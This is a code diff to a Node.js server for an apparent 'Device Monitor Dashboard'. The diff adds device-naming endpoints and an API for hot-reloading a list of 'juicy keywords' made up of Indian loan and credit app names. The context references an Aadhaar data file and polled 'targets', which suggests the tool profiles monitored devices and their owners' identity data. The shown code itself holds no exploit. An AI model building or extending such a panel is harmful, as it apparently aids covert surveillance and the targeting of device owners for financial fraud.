@@ -19,8 +19,8 @@ const AADHAR_FILE      = path.join(DATA_DIR, 'aadhar.json');
 // Poll interval: how often the background poller refreshes each target (ms)
 const POLL_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
 
-// ── Juicy keywords (mirrors DA1.py exactly) ───────────────────────────────────
-const JUICY_KEYWORDS = [
+// ── Juicy keywords (mirrors DA1.py exactly — hot-reloadable via /api/keywords) ─
+let JUICY_KEYWORDS = [
   // Loan / credit apps
   'kreditbee','creditbee','mpokket','navi','nira','moneyview',
   'stucred','snapmint','pfin','poonawala','fincorp',
@@ -987,12 +987,88 @@ app.post('/api/notes/:urlId/:deviceId', express.json(), (req, res) => {
   res.json({ ok: true });
 });
 
+// ── Device Names: save/load human-readable names per device ──────────────────
+const NAMES_FILE = path.join(DATA_DIR, 'device_names.json');
+
+function loadNames() {
+  try { if (fs.existsSync(NAMES_FILE)) return JSON.parse(fs.readFileSync(NAMES_FILE, 'utf8')); }
+  catch {}
+  return {};
+}
+function saveNamesFile(names) {
+  try { fs.writeFileSync(NAMES_FILE, JSON.stringify(names, null, 2)); }
+  catch (e) { console.error('Names save error:', e.message); }
+}
+
+app.get('/api/names/:urlId/:deviceId', (req, res) => {
+  const key = `${req.params.urlId}:${req.params.deviceId}`;
+  res.json({ name: loadNames()[key] || '' });
+});
+
+app.post('/api/names/:urlId/:deviceId', express.json(), (req, res) => {
+  const key = `${req.params.urlId}:${req.params.deviceId}`;
+  const names = loadNames();
+  names[key] = (req.body.name || '').trim();
+  if (!names[key]) delete names[key];
+  saveNamesFile(names);
+  res.json({ ok: true });
+});
+
+// Bulk load all names for a URL (for efficient table rendering)
+app.get('/api/names/:urlId', (req, res) => {
+  const prefix = `${req.params.urlId}:`;
+  const all = loadNames();
+  const forUrl = {};
+  for (const [k, v] of Object.entries(all)) {
+    if (k.startsWith(prefix)) forUrl[k.slice(prefix.length)] = v;
+  }
+  res.json(forUrl);
+});
+
+// ── Keywords: get/update the juicy keywords list ──────────────────────────────
+const KEYWORDS_FILE = path.join(DATA_DIR, 'keywords.json');
+
+function loadKeywords() {
+  try { if (fs.existsSync(KEYWORDS_FILE)) return JSON.parse(fs.readFileSync(KEYWORDS_FILE, 'utf8')); }
+  catch {}
+  // Return the built-in list as default
+  return [...JUICY_KEYWORDS];
+}
+function saveKeywordsFile(kws) {
+  try { fs.writeFileSync(KEYWORDS_FILE, JSON.stringify(kws, null, 2)); }
+  catch (e) { console.error('Keywords save error:', e.message); }
+}
+
+app.get('/api/keywords', (req, res) => {
+  res.json({ keywords: loadKeywords() });
+});
+
+app.post('/api/keywords', express.json(), (req, res) => {
+  const kws = req.body.keywords;
+  if (!Array.isArray(kws)) return res.status(400).json({ error: 'keywords must be array' });
+  const clean = [...new Set(kws.map(k => String(k).trim().toLowerCase()).filter(Boolean))];
+  saveKeywordsFile(clean);
+  // Hot-reload: update in-memory JUICY_KEYWORDS array
+  JUICY_KEYWORDS.length = 0;
+  for (const k of clean) JUICY_KEYWORDS.push(k);
+  res.json({ ok: true, count: clean.length });
+});
+
 // ── Serve frontend ────────────────────────────────────────────────────────────
 app.use(express.static(path.join(__dirname, 'public')));
 app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 // ── Boot ──────────────────────────────────────────────────────────────────────
 loadDashboardDb();
+// Load custom keywords if saved, otherwise use built-in defaults
+const savedKws = (() => {
+  try { if (fs.existsSync(KEYWORDS_FILE)) return JSON.parse(fs.readFileSync(KEYWORDS_FILE, 'utf8')); } catch {}
+  return null;
+})();
+if (savedKws && Array.isArray(savedKws)) {
+  JUICY_KEYWORDS.length = 0;
+  for (const k of savedKws) JUICY_KEYWORDS.push(k);
+}
 app.listen(PORT, () => {
   console.log(`Device Monitor Dashboard running at http://localhost:${PORT}`);
   console.log(`Dashboard DB: ${DB_FILE}`);
